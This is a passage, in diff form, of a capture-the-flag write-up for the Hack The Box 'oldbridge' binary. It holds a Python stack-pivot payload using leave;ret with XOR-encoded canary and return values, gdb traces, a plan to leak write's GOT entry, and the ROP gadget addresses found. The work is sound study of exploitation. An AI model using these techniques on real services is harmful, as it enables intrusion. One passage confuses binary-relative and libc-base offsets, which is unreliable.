@@ -405,3 +405,153 @@ I like to think of `leave` as the "`ret`" instruction of the stack.
 
 Great, so if we `ret` to the `leave` instruction again (1 instruction above the original `ret`), we are basically "popping" the rbp again effectively changing the `rsp` to the value of our choosing!<br>
 All that is required of us is to change the return address to the `leave` instruction. After which the program will execute the `leave` and then the `ret`. The `ret` now will return to a value at the stop of the stack, which **is the custom stack now**
+
+If we send the following payload:
+```python
+    text_section_base = ret_addr & 0xfffffffffffff000
+    text_section_leave_ret = text_section_base + 0xc5c
+    buffer_addr       = old_rbp - 0x480
+
+    # After leaking the necessary values,
+    # We create a new payload
+    payload = "davide" + "AA"
+    payload += p64(0xdeadbeefdeadbeef ^ Ds)
+
+    # Pad to the end of buffer
+    payload += "B" * (1032 - len(payload))
+
+    payload += p64(canary ^ Ds)
+    payload += p64(buffer_addr ^ Ds)
+    payload += p64(text_section_leave_ret ^ Ds)
+
+    send_payload(payload)
+```
+
+
+We get:
+```
+   0x555555554c5c <check_username+237>:	leave  
+=> 0x555555554c5d <check_username+238>:	ret    
+   0x555555554c5e <exit_server>:	push   rbp
+   0x555555554c5f <exit_server+1>:	mov    rbp,rsp
+   0x555555554c62 <exit_server+4>:	sub    rsp,0x20
+   0x555555554c66 <exit_server+8>:	mov    DWORD PTR [rbp-0x14],edi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe118 --> 0xdeadbeefdeadbeef 
+0008| 0x7fffffffe120 ('O' <repeats 200 times>...)
+0016| 0x7fffffffe128 ('O' <repeats 200 times>...)
+0024| 0x7fffffffe130 ('O' <repeats 200 times>...)
+0032| 0x7fffffffe138 ('O' <repeats 200 times>...)
+0040| 0x7fffffffe140 ('O' <repeats 200 times>...)
+0048| 0x7fffffffe148 ('O' <repeats 200 times>...)
+0056| 0x7fffffffe150 ('O' <repeats 200 times>...)
+```
+
+And from here we can write a pretty nice and long ROP chain that can take us where ever we like!
+
+### Leaking an address of a function in libc
+My next step usually is to go ahead to leak some entry from the GOT, take that address to some libc-database and then learn the libc version used in the remote machine.
+
+So let's try that, we'll create a ROP chain to call something like: `write(int socket_fd, (void*) buffer_addr, ssize_t length)`. The `socket_fd` can be figured out by looking at our own process's file descriptors:
+
+```
+=> 0x555555554bad <check_username+62>:	call   0x555555554910 <write@plt>
+   0x555555554bb2 <check_username+67>:	lea    rcx,[rbp-0x410]
+   0x555555554bb9 <check_username+74>:	mov    eax,DWORD PTR [rbp-0x424]
+   0x555555554bbf <check_username+80>:	mov    edx,0x420
+   0x555555554bc4 <check_username+85>:	mov    rsi,rcx
+Guessed arguments:
+arg[0]: 0x4   <---- file_descriptor
+arg[1]: 0x555555554f94 ("Username: ")
+arg[2]: 0xa ('\n')
+```
+
+The same fd can be seen when the process is using `read`:
+
+```
+=> 0x555555554bc9 <check_username+90>:	call   0x555555554970 <read@plt>
+   0x555555554bce <check_username+95>:	mov    DWORD PTR [rbp-0x414],eax
+   0x555555554bd4 <check_username+101>:	mov    DWORD PTR [rbp-0x418],0x0
+   0x555555554bde <check_username+111>:	jmp    0x555555554c0b <check_username+156>
+   0x555555554be0 <check_username+113>:	mov    eax,DWORD PTR [rbp-0x418]
+Guessed arguments:
+arg[0]: 0x4 
+arg[1]: 0x7fffffffe110 --> 0x7ffff7ffe4c8 --> 0x7ffff7ffe428 --> 0x7ffff7ff1510 --> 0x7ffff7ffe170 --> 0x555555554000 (--> ...)
+arg[2]: 0x420 
+```
+
+The address we want to leak is some entry in the GOT table. Specifically we'll use `write@plt` to get the GOT entry of `write` so we can learn the address of that function in libc after the linker placed it there.
+
+```
+gdb-peda$ x/3i 0x555555554910
+   0x555555554910 <write@plt>:	jmp    QWORD PTR [rip+0x20170a]        # 0x555555756020
+   0x555555554916 <write@plt+6>:	push   0x1
+   0x55555555491b <write@plt+11>:	jmp    0x5555555548f0
+gdb-peda$ x/gx 0x555555756020
+0x555555756020:	0x00007ffff7af4140
+gdb-peda$ disas 0x00007ffff7af4140
+Dump of assembler code for function __GI___libc_write:
+   0x00007ffff7af4140 <+0>:	lea    rax,[rip+0x2e07b1]        # 0x7ffff7dd48f8 <__libc_multiple_threads>
+   0x00007ffff7af4147 <+7>:	mov    eax,DWORD PTR [rax]
+   0x00007ffff7af4149 <+9>:	test   eax,eax
+   0x00007ffff7af414b <+11>:	jne    0x7ffff7af4160 <__GI___libc_write+32>
+   0x00007ffff7af414d <+13>:	mov    eax,0x1
+   0x00007ffff7af4152 <+18>:	syscall 
+```
+
+The address we're after is `0x555555756020` which contains the address of `write` at libc.
+The address we want to leak is `0x555555756020 - libc_base = 0x202020` bytes from the start of `libc_base` *which we have already learned*. 
+
+Now we know all of our arguments for `write`:
+1. File descriptor = 0x4
+2. Address of buffer: `libc_base + 0x202020`
+3. Length = 0x8 (We want a QWORD, so 8 bytes)
+4. The address of the function we want to call: `write@plt` is `libc_base + 0x202020` as well and we can call it
+
+The last thing we need is to find a way to load these argument from the stack to the registers. Because as we remember, the arguments in this binary as **passed via registers**. So we have to find some gadgets in the .text section of the binary that would:
+1. pop rdi (first argument)
+2. pop rsi (second argument)
+3. pop rdx (third argument)
+
+```
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x0000555555554000 0x0000555555556000 r-xp	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555755000 0x0000555555756000 r--p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x0000555555756000 0x0000555555757000 rw-p	/from_host/programming2/challenges/hack_the_box/oldbridge/oldbridge
+0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bcb000 0x00007ffff7dcb000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcb000 0x00007ffff7dcf000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p	mapped
+0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ff1000 0x00007ffff7ff3000 rw-p	mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+gdb-peda$ ropsearch "pop rsi" 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: 'pop rsi' in range: 0x555555554000 - 0x555555556000
+0x0000555555554f71 : (b'5e415fc3')	pop rsi; pop r15; ret
+gdb-peda$ ropsearch "pop rdi" 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: 'pop rdi' in range: 0x555555554000 - 0x555555556000
+0x0000555555554f73 : (b'5fc3')	pop rdi; ret
+gdb-peda$ ropsearch "pop rdx" 0x0000555555554000 0x0000555555556000
+Searching for ROP gadget: 'pop rdx' in range: 0x555555554000 - 0x555555556000
+0x0000555555554b53 : (b'5ac3')	pop rdx; ret
+```
+Note: if `ropsearch` doesn't work, you need to `apt-get install nasm`.
+
+We'll add these gadgets to our script:
+```python
+gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
+gadget_pop_rdi_ret         = text_section_base + 0xf73
+gadget_pop_rdx_ret         = text_section_base + 0xb53
+```
+Note: when we'll use `pop_rsi`, we have to remember that there's another `pop` taking place. 
+
+So after leaking the canary, RBP and return address, we construct another payload this time to leak the address of `write` (by using `write`! isn't that confusing?)
+
